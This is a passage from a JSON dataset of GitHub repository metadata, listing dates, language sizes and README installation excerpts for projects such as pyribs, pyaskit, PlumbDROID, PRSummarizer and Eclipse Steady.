                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 4891
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "522": {
        "filename": "icaros-usc_pyribs_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/icaros-usc/pyribs",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "pyribs supports Python 3.8 and above. The vast majority of users can install\npyribs by running:\n\n```bash\n# If you are on Mac, you may need to use quotations, e.g., pip install \"ribs[visualize]\"\npip install ribs[visualize]\n```\n\nThe command above includes the `visualize` extra. If you will not be using the\npyribs visualization tools, you can install the base version of pyribs with:\n\n```bash\npip install ribs\n```\n\nFor more specific installation commands (e.g., installing from Conda or\ninstalling from source), visit the\n[installation selector](https://pyribs.org/#installation) on our website.\n\nTo test your installation, import pyribs and print the version with this\ncommand:\n\n```bash\npython -c \"import ribs; print(ribs.__version__)\"\n```\n\nYou should see a version number in the output.\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "pyribs"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/icaros-usc/pyribs/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "|                                                       PyPI                                                        |                                                               Conda                                                                |                                                                                                      CI/CD                                                                                                       |                                                                   Docs Status                                                                    |\n| :---------------------------------------------------------------------------------------------------------------: | :--------------------------------------------------------------------------------------------------------------------------------: | :--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------: | :----------------------------------------------------------------------------------------------------------------------------------------------: |\n| [![PyPI](https://img.shields.io/pypi/v/ribs.svg?style=flat-square&color=blue)](https://pypi.python.org/pypi/ribs) | [![Conda Recipe](https://img.shields.io/badge/recipe-pyribs-green.svg?style=flat-square)](https://anaconda.org/conda-forge/pyribs) | [![Tests](https://img.shields.io/endpoint.svg?url=https%3A%2F%2Factions-badge.atrox.dev%2Ficaros-usc%2Fpyribs%2Fbadge&style=flat-square)](https://github.com/icaros-usc/pyribs/actions?query=workflow%3A\"Tests\") | [![Documentation Status](https://readthedocs.org/projects/ribs/badge/?version=stable&style=flat-square)](https://readthedocs.org/projects/ribs/) | \n",
                    "original_header": "pyribs"
                },
                "confidence": 0.9999699343933021,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/icaros-usc/pyribs/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Need some help? Want to ask if pyribs is right for your project? Have a question\nthat is not quite a bug and not quite a feature request? \n",
                    "original_header": "Community"
                },
                "confidence": 0.9574810052520949,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/icaros-usc/pyribs/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "pyribs users include: \n",
                    "original_header": "Users"
                },
                "confidence": 0.9526486941359469,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/icaros-usc/pyribs/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-09-10T07:47:17Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-26T23:32:27Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 690335
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 5341
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 2760
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "523": {
        "filename": "katsumiok_pyaskit_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/katsumiok/pyaskit",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "To install *AskIt*, run this command in your terminal:\n\n```bash\npip install pyaskit\n```\nor\n```bash\npip install git+https://github.com/katsumiok/pyaskit.git\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "*AskIt* (pyaskit)"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/katsumiok/pyaskit/main/README.md"
            },
            {
                "result": {
                    "value": "Before using *AskIt*, you need to set your API key as an appropriate environment variable:\n\n- OpenAI API: `OPENAI_API_KEY`\n- Gemini API: `GOOGLE_API_KEY`\n- Claude API: `ANTHROPIC_API_KEY`\n- COHERE API: `CO_API_KEY`\n- groq API: `GROQ_API_KEY`\n\nFor example, to use OpenAI API, you need to set your OpenAI API key as an environment variable `OPENAI_API_KEY`:\n```bash\nexport OPENAI_API_KEY=<your OpenAI API key>\n```\n`<your OpenAI API key>` is a string that looks like this: `sk-<your key>`.\n You can find your OpenAI API key in the [OpenAI dashboard](https://platform.openai.com/account/api-keys).\n\nYou need to specify the model name as an environment variable `ASKIT_MODEL`:\n```bash\nexport ASKIT_MODEL=<model name>\n```\n`<model name>` is the name of the model you want to use.\nThe latest AskIt is tested with `gpt-4`, `gpt-3.5-turbo-16k`, `gemini-pro`, `claude-2.1`, and `cohere-2.0`. You can find the list of available models in the [OpenAI API documentation](https://platform.openai.com/docs/models), [Gemini API documentation](https://ai.google.dev/), [Claude API documentation](https://anthropic.com/), and [COHERE API documentation](https://cohere.ai/).\nYou can also find the available models in the [`models.py`](https://github.com/katsumiok/pyaskit/blob/main/pyaskit/models.py) file.\n",
                    "type": "Text_excerpt",
                    "original_header": "Preparation for OpenAI API, Gemini API, Claude API, or COHERE API",
                    "parent_header": [
                        "*AskIt* (pyaskit)",
                        "Installation"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/katsumiok/pyaskit/main/README.md"
            },
            {
                "result": {
                    "value": "Before using *AskIt* with Llama 2, you need to install it. To install Llama 2, run this command in your terminal:\n```bash\npip install git+https://github.com/facebookresearch/llama.git\n```\nYou also need to download the tokenizer model and the checkpoint of the model you want to use. Please refer to the Llama 2 documentation for further details.\n\nWe provide an example of using *AskIt* with Llama 2 in the [examples](examples) directory.\nTo run the example, run this command in your terminal:\n\n```shell\ntorchrun --nproc_per_node 1 examples/use_llama2.py \\\n    --ckpt_dir llama-2-7b-chat/ \\\n    --tokenizer_path tokenizer.model \\\n    --max_seq_len 512 --max_batch_size 6\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Preparation for Llama 2 API (Experimental)",
                    "parent_header": [
                        "*AskIt* (pyaskit)",
                        "Installation"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/katsumiok/pyaskit/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "| Type | Description | Type Example | Value Example |\n| --- | --- | --- | --- |\n| `int` | Integer | `t.int` |  123 |\n| `float` | Floating Point Number | `t.float` | 1.23 |\n| `bool` | Boolean | `t.bool` | True |\n| `str` | String | `t.str` | \"Hello World!\" |\n| `literal` | Literal | `t.literal(123)` | 123 |\n| `list` | List |  `t.list(t.int)` | [1, 2, 3] |\n| `dict` | Dictionary |  `t.dict({` <br>&nbsp;`'a': t.int, `<br>&nbsp;`'b': t.str` <br>`})` |{'a': 1, 'b': \"abc\"} |\n| `record`| Dictionary | `t.record(t.str, t.int)` | {'a': 1, 'b': 2} | \n| `tuple` | Tuple | `t.tuple(t.int, t.str)` | (1, \"abc\") |\n| `union` | Union (Multiple Possible Values) | `t.union(t.literal('yes'), t.literal('no'))` | \"yes\" or \"no\" |\n|         |                                  | `t.literal('yes') \\| t.literal('no')` | \"yes\" or \"no\" |\n|         |                                  | `t.literal('yes', 'no')` | \"yes\" or \"no\" |\n| `None`  | None                             | `None` | None | \n",
                    "original_header": "Specifying Types in *AskIt*"
                },
                "confidence": 0.9998550507276229,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/katsumiok/pyaskit/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-07-24T18:05:43Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-10T07:41:34Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 79680
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "524": {
        "filename": "sakshiudeshi_Aequitas_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/sakshiudeshi/Aequitas",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2018-07-10T12:56:50Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-03-15T13:33:12Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 82860
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "525": {
        "filename": "eroenooms_jsonlite_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/jeroen/jsonlite",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2013-10-03T18:05:25Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-10-02T16:16:26Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 178287
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "R",
                    "name": "R",
                    "type": "Programming_language",
                    "size": 117373
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "TeX",
                    "name": "TeX",
                    "type": "Programming_language",
                    "size": 66258
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 3083
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "526": {
        "filename": "bhargavbh_PlumbDROID_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/bhargavbh/PlumbDROID",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "**0. Requirements**\n\nPlumbDROID has the following major dependencies:\n  $ Androguard 3.3.5 (https://pypi.org/project/androguard/)\n  $ Apktool 2.4.0 (https://ibotpeaches.github.io/Apktool/install/)\n  $ Android SDK along with Android Studio to run tests.\n\n**1. Install Androguard**\n- ```pip install -U androguard```\n\n**2. Install Apktool**\n- procedure described for MacOS\n\n  -> Download [Mac wrapper](https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/osx/apktool) script (Right click, Save Link As apktool)\n\n  -> Download apktool-2 (find version 2.4.0 [here](https://bitbucket.org/iBotPeaches/apktool/downloads/))\n\n  -> Rename downloaded jar to apktool.jar\n\n  -> Move both files (apktool.jar & apktool) to /usr/local/bin (root needed)\n\n  -> Make sure both files are executable (chmod +x)\n\n\n**3. Install Android SDK** (go to next step if you already have it)\nThe next steps will allow you to install Android SDK in Non-GUI mode:\n- Download and unzip Android SDK:\n    ```sh\n    $ cd\n    $ wget http://dl.google.com/android/android-sdk_r24.2-macos.tgz\n    $ tar -xvf android-sdk_r24.2-macos.tgz\n    ```\n\n- Add Android SDK to path (if you don't use Bash i.e. you prefer Zsh, remember to modify the correct file). To to that, add these two lines to your `~/.bashrc` file:\n    ```\n    export ANDROID_HOME=$HOME/android-sdk-linux/\n    export PATH=$PATH:$ANDROID_HOME/tools\n    export PATH=$PATH:$ANDROID_HOME/platform-tools\n    ```\n- Load the libraries in the current session with:\n\n    ```sh\n    $ source ~/.bashrc\n    ```\n- NOTE: If you need to run PlumbDroid on apps following the manifestation file design prior to Android 7.3.2,\n  use Android Studio with a different xml parser: version 1.4 or prior.\n\n**3. Prepare PlumbDROID**\n\n- We need to give the necessary permissions to all the scripts\n    ```sh\n    $ chmod 744 PlumbDROID/*.sh\n    ```\n\n**4. Install the Python libraries required**\n\n- The following Python libraries are required:\n    ```sh\n    $ pip install -r PlumbDROID/requirements.txt\n    ```\n\n**5. Now we can run PlumbDROID**\n- If everything was OK, we can now run PlumbDROID:\n    ```sh\n    $ cd PlumbDROID/\n    $ python PlumbDROID.py -s </PATH/TO/FOLDER/WITH/APKS/>\n    ```\n",
                    "type": "Text_excerpt",
                    "original_header": "How to install",
                    "parent_header": [
                        "PlumbDROID",
                        "PlumbDROID (Tool)"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/bhargavbh/PlumbDROID/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-06-28T14:32:22Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-07-04T02:54:02Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 83348
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Smali",
                    "name": "Smali",
                    "type": "Programming_language",
                    "size": 19424
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 15649
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Batchfile",
                    "name": "Batchfile",
                    "type": "Programming_language",
                    "size": 11484
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "527": {
        "filename": "ASE-REEF_REEF-script_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ASE-REEF/REEF-script",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2023-08-16T10:26:46Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-07-19T05:21:07Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 23109
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "528": {
        "filename": "Tbabm_PRSummarizer_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/Tbabm/PRSummarizer",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "```bash\n$ git clone https://github.com/Tbabm/PRSummarizer.git\n$ cd PRSummarizer\n$ mkdir data\n# download our preprocessed dataset and place the four files in `data`\n$ mkdir models\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Clone and Prepare Dataset",
                    "parent_header": [
                        "PRSummarizer",
                        "Installation"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/Tbabm/PRSummarizer/master/README.md"
            },
            {
                "result": {
                    "value": "- See [here](https://gist.github.com/Tbabm/65b5d8a3adb9845d55ce27143913e3b2) for instructions about installing ROUGE\n- Please make sure you have correctly set environment variable `ROUGE` to `/absolute/path/to/ROUGE-RELEASE-1.5.5`\n",
                    "type": "Text_excerpt",
                    "original_header": "Install ROUGE",
                    "parent_header": [
                        "PRSummarizer",
                        "Installation"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/Tbabm/PRSummarizer/master/README.md"
            },
            {
                "result": {
                    "value": "**Through conda**:\n\n```bash\n$ conda env create -f environment.yml\n```\n\n**OR** through pip\n\n```bash\n$ pip install -r requirements.txt\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Install Dependencies",
                    "parent_header": [
                        "PRSummarizer",
                        "Installation"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/Tbabm/PRSummarizer/master/README.md"
            },
            {
                "result": {
                    "value": "- install and test pyrouge if you haven't done it.\n\n```bash\n$ git clone https://github.com/bheinzerling/pyrouge\n$ cd pyrouge\n$ pip install .\n\n# set rouge path for pyrouge\n$ pyrouge_set_rouge_path ${ROUGE}\n\n# test the installation of pyrouge\n$ python -m pyrouge.test\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Install pyrouge",
                    "parent_header": [
                        "PRSummarizer",
                        "Installation"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/Tbabm/PRSummarizer/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Our collected 333K pull requests can be downloaded from [here](https://drive.google.com/drive/folders/1VMByXOEmJDQL_JQY6l63NRiveUySY-Sq?usp=sharing). Here is a PR example in the json file:\n```json\n{\n    \"id\": \"elastic/elasticsearch_37980\",\n    \"body\": \"'Eclipse build files were missing so .eclipse project files were not being generated.\\\\r\\\\nCloses #37973\\\\r\\\\n\\\\r\\\\n'\",\n    \"cms\": [\n      \"'Added missing eclipse-build.gradle files\\\\n\\\\nCloses #fix/37973'\"\n    ],\n    \"commits\": {\n      \"'3e10ee798c932cc1cab1ea6ca679417408fc1416'\": {\n        \"cm\": \"'Added missing eclipse-build.gradle files\\\\n\\\\nCloses #fix/37973'\",\n        \"comments\": []\n      }\n    }\n  }\n```\n \n",
                    "original_header": "Raw Data"
                },
                "confidence": 0.999918253820769,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Tbabm/PRSummarizer/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2019-08-21T08:44:06Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-05-07T03:23:29Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 100055
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "529": {
        "filename": "ansonmiu0214_scribble-noughts-and-crosses_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ansonmiu0214/scribble-noughts-and-crosses",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Prerequisites:\n* Node.js\n  * `brew install node` or equivalent\n* TypeScript\n  * `npm i -g typescript` \nInstall packages:\n```bash\n# Server\ncd server/\nnpm install\n\ncd ../\n\n# Client\ncd client/\nnpm install\n``` \n1. Run the server:\n```bash\ncd server/\nnpm run-script build\nnpm start\n``` \n2. Run the client:\n```bash\ncd client/\nnpm start\n``` \n3. Access `localhost:3000` on 2 separate browser windows\n4. Play! \n",
                    "original_header": "Noughts and Crosses with Scribble <a href=\"https://arxiv.org/abs/2004.01321\"><img alt=\"arXiv\" src=\"https://img.shields.io/badge/arXiv-2004.01321-b31b1b.svg\" /></a>"
                },
                "confidence": 0.9809146132256495,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/ansonmiu0214/scribble-noughts-and-crosses/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-01-21T17:18:50Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2020-09-22T11:20:56Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "TypeScript",
                    "name": "TypeScript",
                    "type": "Programming_language",
                    "size": 40513
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 1806
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 869
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "530": {
        "filename": "nyu-mll_ILF-for-code-generation_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/nyu-mll/ILF-for-code-generation",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "Our code relies upon the [`jaxformer` repository](https://github.com/salesforce/jaxformer) and open-source [CodeGen-Mono checkpoints](https://github.com/salesforce/CodeGen).\n\nTo install all dependencies and download the necessary model checkpoints:\n```{bash}\ngit clone git@github.com:nyu-mll/ILF-for-code-generation.git\ncd ILF-for-code-generation\nconda env create -f environment.yml\n\n# Install codegen repo and reset to old commit\ngit clone git@github.com:salesforce/CodeGen.git\ncd CodeGen\ngit reset --hard 9cc1f971c83ad606cce5da292d3c58523dd920a2\ngit clean -df\npip3 install -r requirements.txt\ncd ..\n\n# To download codegen-6B-mono\nwget -P checkpoints https://storage.googleapis.com/sfr-codegen-research/checkpoints/codegen-6B-mono.tar.gz && tar -xvf checkpoints/codegen-6B-mono.tar.gz -C checkpoints/\n\n```\n\nIn our paper we use the Codegen-Mono 6B checkpoint, but you can easily replace the above `wget` command with the download links for the [other CodeGen models](https://github.com/salesforce/CodeGen#sampling-with-repository).\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "Improving Code Generation by Training with Natural Language Feedback"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/nyu-mll/ILF-for-code-generation/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-03-23T22:46:02Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-22T09:49:53Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 79976
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 8372
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "531": {
        "filename": "WeixiangYAN_CodeScope_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/WeixiangYAN/CodeScope",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2023-11-12T00:16:50Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-22T02:05:00Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 674160
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 4138
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 535
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 372
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Rust",
                    "name": "Rust",
                    "type": "Programming_language",
                    "size": 289
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 285
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Kotlin",
                    "name": "Kotlin",
                    "type": "Programming_language",
                    "size": 221
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 123
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Ruby",
                    "name": "Ruby",
                    "type": "Programming_language",
                    "size": 117
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 112
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Go",
                    "name": "Go",
                    "type": "Programming_language",
                    "size": 107
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "PHP",
                    "name": "PHP",
                    "type": "Programming_language",
                    "size": 80
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "532": {
        "filename": "NAIST-SE_steady_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/NAIST-SE/steady",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "**Note**: This is a work in progress repository for **Node.js JavaScript** application analysis. \n",
                    "original_header": "Eclipse Steady (Incubator Project)"
                },
                "confidence": 0.9937694312562734,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/NAIST-SE/steady/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Eclipse Steady is built with Maven. To enable the support for Gradle the profile `gradle` needs to be activated (`-P gradle`)\n```sh\nmvn clean install\n```\n \nDuring the `install`ation phase of `mvn` all the tests are run. Long-running tests can be disabled with the flag `-DexcludedGroups=com.sap.psr.vulas.shared.categories.Slow`. All the tests can be disabled with the flag `-DskipTests`.\n \n",
                    "original_header": "Build and Test"
                },
                "confidence": 0.9981396798988846,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/NAIST-SE/steady/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- Static and dynamic analyses are not implemented for Python\n- Static analysis for Java is only supported until Java 8\n- Java 9 multi-release archives are not supported (classes below `META-INF/versions` are simply ignored)\n \n",
                    "original_header": "Limitations"
                },
                "confidence": 0.9836778962795728,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/NAIST-SE/steady/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2019-01-09T07:55:51Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-02-24T06:11:35Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 9994349
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 1452126
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 181425
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 130778
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "ANTLR",
                    "name": "ANTLR",
                    "type": "Programming_language",
                    "size": 108370
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 8230
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 2094
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 1704
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Groovy",
                    "name": "Groovy",
                    "type": "Programming_language",
                    "size": 1336
                },
                "confidence": 1,
